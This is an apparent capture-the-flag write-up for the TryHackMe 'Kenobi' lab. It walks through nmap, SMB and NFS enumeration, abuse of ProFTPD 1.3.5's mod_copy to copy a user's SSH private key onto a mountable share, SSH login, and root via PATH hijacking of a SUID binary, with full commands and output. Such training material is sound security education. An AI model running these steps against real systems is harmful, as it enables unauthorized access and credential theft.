![](https://miro.medium.com/max/1400/1*6sDz4jzYMvy15OBGxp5FPg.png)

This is a writeup for [Kenobi](https://tryhackme.com/room/kenobi) Room on Tryhackme

### Port Scanning
Spin up your target machine and let’s run an nmap scan to see what ports are open

```
#nmap -Pn -sV -sC 10.10.229.88          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 08:36 EDT
Nmap scan report for 10.10.229.88
Host is up (0.42s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      48621/tcp   mountd
|   100005  1,2,3      55339/udp   mountd
|   100005  1,2,3      55546/udp6  mountd
|   100005  1,2,3      59111/tcp6  mountd
|   100021  1,3,4      40095/tcp6  nlockmgr
|   100021  1,3,4      46477/tcp   nlockmgr
|   100021  1,3,4      49937/udp6  nlockmgr
|   100021  1,3,4      52510/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h39m56s, deviation: 2h53m13s, median: -4s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-03-15T07:37:01-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-03-15T12:37:00
|_  start_date: N/A
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
1. Scan the machine with nmap, how many ports are open?
``` 7 ```

### Enumerating Samba for Shares

SMB has two ports, 445 and 139, Now let’s use NMAP scripts to [enumerate Shares](https://nmap.org/nsedoc/scripts/smb-enum-shares.html) and [Usernames.](https://nmap.org/nsedoc/scripts/smb-enum-users.html)

```
$ sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.229.88
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 08:49 EDT
Nmap scan report for 10.10.229.88
Host is up (0.41s latency).
PORT    STATE SERVICE
445/tcp open  microsoft-ds
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.229.88\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.229.88\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.229.88\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
Nmap done: 1 IP address (1 host up) scanned in 62.39 seconds
```
1. Using the nmap command above, how many shares have been found?
   ```3```

Now let’s try to access the shares without a password, we can do this by username as ‘anonymous’ and leave the password empty.

```
$ smbclient //10.10.229.88/anonymous                                           
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
9204224 blocks of size 1024. 6877104 blocks available
```
2. Once you’re connected, list the files on the share. What is the file can you see?
    ```log.txt```

and let’s download the file with

```
smbget -R smb://10.10.229.88/anonymous
```
and if you open the log.txt file after downloading you will find answers to the below questions.

3. What port is FTP running on?
   ```21```

Now let’s enumerate RPC port 111 we found in our nmap scan and we are going to use nmap scripts to [list files on share](https://nmap.org/nsedoc/scripts/nfs-ls.html), [disk statistics](https://nmap.org/nsedoc/scripts/nfs-statfs.html) and [display mounts.](https://nmap.org/nsedoc/scripts/nfs-showmount.html)

    ```
    sudo nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.229.88
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 09:01 EDT
Nmap scan report for 10.10.229.88
Host is up (0.41s latency).
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836528.0  6877100.0  22%   16.0T        32000
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

4. What mount can we see?
```/var```

### Gain Initial Access with ProFTPd

Let’s make a raw connection to the FTP port with netcat to grab the service banner
```
netcat 10.10.229.88 21                                                                                                                                                                                      1 ⨯
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.229.88]
ls
```

1. What is the version?
```1.3.5```
Use searchsploit to look for exploits on ProFTPD
```
searchsploit proftpd 1.3.5                                                                                                                                                                                  1 ⚙
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                                         | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                               | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                                           | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                                         | linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

2. How many exploits are there for the ProFTPd running?
```4```
Now let’s copy kenobi private key from ‘/home/kenobi .ssh/’ to ‘/var/tmp/’ folder but first connect to port 21 with netcat
````
#nc 10.10.49.245 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.49.245]
SITE CPFR /home/kenobi .ssh/id_rsa
550 /home/kenobi .ssh/id_rsa: No such file or directory
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
421 Login timeout (300 seconds): closing control connection
CPFR Copy from
CPTO Copy To
```
Now, let’s mount the ‘/var/’ folder to our attack machine
```
┌──(kali㉿kali)-[~]
└─$ sudo mount 10.10.49.245:/var/ /mnt/kenobiNFS                                                                                                                                                          148 ⨯ 1 ⚙
                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ la -la /mnt/kenobiNFS/                                                                                                                                                                                      1 ⚙
total 56
drwxr-xr-x 14 root root    4096 Sep  4  2019 .
drwxr-xr-x  3 root root    4096 Mar 18 22:36 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
drwxrwxrwt  6 root root    4096 Mar 18 22:36 tmp
drwxr-xr-x  3 root root    4096 Sep  4  2019 www
```

And copy the id_rsa file from ‘/mnt/kenobiNFS/tmp/id_rsa’ and give ‘id_rsa’ file read and write permissions
And finally make an ssh connection and find the user flag.
```
┌──(kali㉿kali)-[~]
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .                                                                                                                                                                              
                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ sudo chmod 600 id_rsa                                                                                                                                                                                      
                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ sudo ssh -i id_rsa kenobi@10.10.49.245                                                                                                                                                                      
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
* Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
103 packages can be updated.
65 updates are security updates.
Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
kenobi@kenobi:~$ ls
share  user.txt
```

### Privilege Escalation with Path Variable Manipulation
👀 Read the room notes

First we need to look for files that have SUID bit, We can do it running

find / -perm -u=s -type f 2>/dev/null

```
kenobi@kenobi:/$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

1. What file looks particularly out of the ordinary?
```/usr/bin/menu```

Run the binary
```
kenobi@kenobi:~$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Mon, 21 Mar 2022 16:58:23 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

2. Run the binary, how many options appear?

```3```

We extract human readable strings from the binary with the strings command
```
kenobi@kenobi:/$ strings /usr/bin/menu
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
```

And we can see the binary runs system commands
As this file runs as the root users privileges, we can manipulate our path gain a root shell.
```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
```

and when you choose 1 as your choice, you would get shell as a root, cat /root/root.txt to find answer for the last question.

Thanks for Reading.


